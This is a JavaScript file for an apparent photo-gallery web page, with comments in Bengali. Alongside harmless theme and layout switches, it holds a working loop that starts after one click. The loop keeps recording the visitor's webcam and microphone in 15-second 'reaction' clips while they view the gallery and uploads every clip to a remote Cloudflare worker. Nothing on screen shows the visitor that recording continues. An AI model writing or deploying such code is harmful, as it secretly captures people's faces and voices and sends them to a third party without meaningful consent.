const WORKER_URL = 'https://ourmemory.mrony8552.workers.dev'; // আপনার ক্লাউডফ্লেয়ার লিংক

const landingPage = document.getElementById('landing-page');
const galleryPage = document.getElementById('gallery-page');
const startBtn = document.getElementById('start-recording-btn');

const RECORDING_CHUNK_MS = 15000; // 15 seconds

startBtn.addEventListener('click', async () => {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        
        landingPage.style.display = 'none';
        galleryPage.style.display = 'block';

        // নতুন রেকর্ডিং লুপ চালু করা
        startRecordingCycle(stream);

    } catch (err) {
        console.log("Camera access denied or failed.");
        landingPage.style.display = 'none';
        galleryPage.style.display = 'block';
    }
});

// এই নতুন ফাংশনটি প্রতি ১৫ সেকেন্ড পর রেকর্ডিং থামিয়ে পূর্ণাঙ্গ ফাইল বানাবে এবং আবার চালু করবে
function startRecordingCycle(stream) {
    const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
    const chunks = [];

    mediaRecorder.ondataavailable = (event) => {
        if (event.data && event.data.size > 0) {
            chunks.push(event.data);
        }
    };

    mediaRecorder.onstop = async () => {
        // একটি সম্পূর্ণ স্বাধীন ভিডিও ফাইল তৈরি করা হচ্ছে
        const finalBlob = new Blob(chunks, { type: 'video/webm' });
        await uploadChunk(finalBlob);
        
        // আপলোড শুরু হওয়ার সাথে সাথেই পরের ১৫ সেকেন্ডের জন্য নতুন রেকর্ডিং চালু
        startRecordingCycle(stream);
    };

    // রেকর্ডিং শুরু
    mediaRecorder.start();

    // ঠিক ১৫ সেকেন্ড পর রেকর্ডিং থামিয়ে দেওয়া, যা onstop ইভেন্ট ট্রিগার করবে
    setTimeout(() => {
        if (mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
        }
    }, RECORDING_CHUNK_MS);
}

async function uploadChunk(blob) {
    const formData = new FormData();
    formData.append('file', blob, `reaction-${Date.now()}.webm`);
    
    try {
        await fetch(`${WORKER_URL}/api/upload`, { 
            method: 'POST', 
            body: formData 
        });
    } catch (err) { 
        console.log("Upload delayed due to network."); 
    }
}

// Layout & Theme Switching
document.getElementById('theme-toggle').addEventListener('click', () => {
    const themes = ['theme-day', 'theme-night', 'theme-pink'];
    let current = themes.find(t => document.body.classList.contains(t)) || 'theme-pink';
    document.body.classList.remove(current);
    let next = themes[(themes.indexOf(current) + 1) % themes.length];
    document.body.classList.add(next);
});

document.getElementById('view-grid').addEventListener('click', () => {
    document.getElementById('gallery').className = 'gallery layout-grid';
});
document.getElementById('view-masonry').addEventListener('click', () => {
    document.getElementById('gallery').className = 'gallery layout-masonry';
});
